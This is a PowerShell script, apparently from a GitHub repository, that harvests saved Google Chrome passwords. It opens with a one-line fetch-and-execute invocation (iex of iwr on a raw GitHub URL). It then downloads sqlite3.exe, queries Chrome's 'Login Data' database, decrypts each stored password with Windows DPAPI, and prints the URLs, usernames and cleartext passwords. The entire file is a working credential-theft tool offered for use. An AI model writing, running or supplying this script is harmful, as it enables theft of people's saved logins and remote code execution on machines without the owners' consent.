
# One-line invocation: iex $(iwr "https://raw.githubusercontent.com/doxd/powershell/master/Credentials/Get-ChromeCreds.ps1").Content

Function Download-SqliteTools{
	# https://www.sqlite.org/2018/sqlite-tools-win32-x86-3240000.zip
	# https://github.com/doxd/powershell/raw/master/Credentials/sqlite-tools-win32-x86-3240000/sqlite3.exe
	# https://raw.githubusercontent.com/doxd/powershell/master/Credentials/sqlite-tools-win32-x86-3240000/sqlite3.exe
	mkdir sqlite-tools-win32-x86-3240000
	[Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls, Ssl3"
	iwr "https://raw.githubusercontent.com/doxd/powershell/master/Credentials/sqlite-tools-win32-x86-3240000/sqlite3.exe" -OutFile ".\sqlite-tools-win32-x86-3240000\sqlite3.exe"	
}

Function Convert-HexToByteArray {

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )

    $Bytes = [byte[]]::new($HexString.Length / 2)

    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }

    $Bytes
}


Download-SqliteTools

$home_dir = $env:HOMEPATH
$login_db_file = "c:$home_dir\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$sqlite_exe = ".\sqlite-tools-win32-x86-3240000\sqlite3.exe"
$output_csv_format = & $sqlite_exe  $login_db_file -csv "select origin_url,username_value,hex(password_value) from logins;" ""

Add-Type -AssemblyName System.Security

$logins = ConvertFrom-Csv -Header url,u,p $output_csv_format

$logins | % {
   $pass_bytes = Convert-HexToByteArray $_.p
   $pass_clear = [System.Text.Encoding]::Default.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($pass_bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) )
   echo "$($_.url)`t$($_.u)`t$pass_clear"
}





